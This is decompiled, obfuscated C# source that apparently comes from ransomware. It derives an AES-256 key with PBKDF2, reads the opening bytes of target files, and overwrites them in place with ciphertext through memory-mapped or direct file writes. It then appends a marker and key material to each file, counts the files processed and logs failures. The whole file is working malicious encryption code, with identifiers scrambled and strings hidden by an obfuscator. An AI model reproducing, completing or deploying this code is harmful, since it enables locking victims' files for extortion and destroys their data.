using System;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Security.Cryptography;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace GfIOnzejDqtqB;

public static class YuMGwWVrDuXKA
{
	[NonSerialized]
	internal static GetString getString_0;

	public static byte[] NzljVXFBjDaHS(byte[] byte_0, byte[] byte_1, byte[] byte_2)
	{
		byte[] result = null;
		Rfc2898DeriveBytes rfc2898DeriveBytes = CNfuzrxMcRqV(byte_1, byte_2);
		byte_1 = null;
		GC.Collect();
		using Aes aes = new AesManaged();
		aes.KeySize = 256;
		aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
		aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
		aes.Padding = PaddingMode.None;
		aes.Mode = CipherMode.CBC;
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(byte_0, 0, byte_0.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		rfc2898DeriveBytes.Dispose();
		return result;
	}

	public static Rfc2898DeriveBytes CNfuzrxMcRqV(byte[] byte_0, byte[] byte_1)
	{
		return new Rfc2898DeriveBytes(byte_0, byte_1, 52768);
	}

	public static byte[] rQKmlPLmPLw(string string_0, int int_0)
	{
		byte[] array = new byte[int_0];
		try
		{
			if (XpwFCiWTIXog.mLyGnpszUKM == getString_0(107397009))
			{
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(string_0, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Read(array, 0, int_0);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				return array;
			}
			FileStream fileStream = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream.Read(array, 0, int_0);
			fileStream.Close();
			fileStream.Dispose();
			return array;
		}
		catch (Exception ex)
		{
			if (XpwFCiWTIXog.AreaxgrYTj)
			{
				try
				{
					File.AppendAllText(XpwFCiWTIXog.RqqYTsMuxEQen, getString_0(107389954) + string_0 + getString_0(107404073) + ex.Message + getString_0(107397204));
				}
				catch (Exception)
				{
				}
			}
			FileStream fileStream2 = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream2.Read(array, 0, int_0);
			fileStream2.Close();
			fileStream2.Dispose();
			return array;
		}
	}

	public static bool KGbVnsOVmaox(string ZXZtbOtOvaKKAi, byte[] gGvXHaVXPnSt, byte[] EHaoPciFCiUco = null)
	{
		try
		{
			byte[] array = null;
			if (XpwFCiWTIXog.mLyGnpszUKM == getString_0(107397009))
			{
				array = (XpwFCiWTIXog.fpnZuwWWrCf ? Encoding.ASCII.GetBytes(XpwFCiWTIXog.pimTPtzgsj(XpwFCiWTIXog.WwmvyHoShcYd) + XpwFCiWTIXog.pimTPtzgsj(getString_0(107404047)) + Convert.ToString(XpwFCiWTIXog.tKbCgjZzNwIevCY) + XpwFCiWTIXog.pimTPtzgsj(getString_0(107404047))) : Encoding.ASCII.GetBytes(XpwFCiWTIXog.pimTPtzgsj(XpwFCiWTIXog.WwmvyHoShcYd) + XpwFCiWTIXog.pimTPtzgsj(getString_0(107404056)) + Convert.ToString(XpwFCiWTIXog.tKbCgjZzNwIevCY) + XpwFCiWTIXog.pimTPtzgsj(getString_0(107404056))));
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(ZXZtbOtOvaKKAi, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Write(gGvXHaVXPnSt, 0, gGvXHaVXPnSt.Length);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				using FileStream fileStream = new FileStream(ZXZtbOtOvaKKAi, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!XpwFCiWTIXog.fpnZuwWWrCf)
				{
					fileStream.Write(array, 0, array.Length);
				}
				else
				{
					fileStream.Write(EHaoPciFCiUco, 0, EHaoPciFCiUco.Length);
					fileStream.Write(array, 0, array.Length);
				}
			}
			else
			{
				array = (XpwFCiWTIXog.fpnZuwWWrCf ? Encoding.ASCII.GetBytes(XpwFCiWTIXog.pimTPtzgsj(XpwFCiWTIXog.WwmvyHoShcYd) + XpwFCiWTIXog.pimTPtzgsj(getString_0(107404047)) + Convert.ToString(XpwFCiWTIXog.tKbCgjZzNwIevCY) + XpwFCiWTIXog.pimTPtzgsj(getString_0(107404047))) : Encoding.ASCII.GetBytes(XpwFCiWTIXog.pimTPtzgsj(XpwFCiWTIXog.WwmvyHoShcYd) + XpwFCiWTIXog.pimTPtzgsj(getString_0(107404056)) + Convert.ToString(XpwFCiWTIXog.tKbCgjZzNwIevCY) + XpwFCiWTIXog.pimTPtzgsj(getString_0(107404056))));
				FileStream fileStream2 = new FileStream(ZXZtbOtOvaKKAi, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
				fileStream2.Write(gGvXHaVXPnSt, 0, gGvXHaVXPnSt.Length);
				fileStream2.Close();
				fileStream2.Dispose();
				using FileStream fileStream3 = new FileStream(ZXZtbOtOvaKKAi, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!XpwFCiWTIXog.fpnZuwWWrCf)
				{
					fileStream3.Write(array, 0, array.Length);
				}
				else
				{
					fileStream3.Write(EHaoPciFCiUco, 0, EHaoPciFCiUco.Length);
					fileStream3.Write(array, 0, array.Length);
				}
			}
			XpwFCiWTIXog.YIvQxgIKBLMzUZ++;
		}
		catch (Exception ex)
		{
			if (XpwFCiWTIXog.AreaxgrYTj)
			{
				try
				{
					File.AppendAllText(XpwFCiWTIXog.RqqYTsMuxEQen, getString_0(107389954) + ZXZtbOtOvaKKAi + getString_0(107404006) + ex.Message + getString_0(107397204));
				}
				catch (Exception)
				{
				}
			}
			byte[] array2 = null;
			array2 = (XpwFCiWTIXog.fpnZuwWWrCf ? Encoding.ASCII.GetBytes(XpwFCiWTIXog.pimTPtzgsj(XpwFCiWTIXog.WwmvyHoShcYd) + XpwFCiWTIXog.pimTPtzgsj(getString_0(107404047)) + Convert.ToString(XpwFCiWTIXog.tKbCgjZzNwIevCY) + XpwFCiWTIXog.pimTPtzgsj(getString_0(107404047))) : Encoding.ASCII.GetBytes(XpwFCiWTIXog.pimTPtzgsj(XpwFCiWTIXog.WwmvyHoShcYd) + XpwFCiWTIXog.pimTPtzgsj(getString_0(107404056)) + Convert.ToString(XpwFCiWTIXog.tKbCgjZzNwIevCY) + XpwFCiWTIXog.pimTPtzgsj(getString_0(107404056))));
			FileStream fileStream4 = new FileStream(ZXZtbOtOvaKKAi, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
			fileStream4.Write(gGvXHaVXPnSt, 0, gGvXHaVXPnSt.Length);
			fileStream4.Close();
			fileStream4.Dispose();
			using (FileStream fileStream5 = new FileStream(ZXZtbOtOvaKKAi, FileMode.Append, FileAccess.Write, FileShare.ReadWrite))
			{
				if (!XpwFCiWTIXog.fpnZuwWWrCf)
				{
					fileStream5.Write(array2, 0, array2.Length);
				}
				else
				{
					fileStream5.Write(EHaoPciFCiUco, 0, EHaoPciFCiUco.Length);
					fileStream5.Write(array2, 0, array2.Length);
				}
			}
			return false;
		}
		return true;
	}

	static YuMGwWVrDuXKA()
	{
		Strings.CreateGetStringDelegate(typeof(YuMGwWVrDuXKA));
	}
}
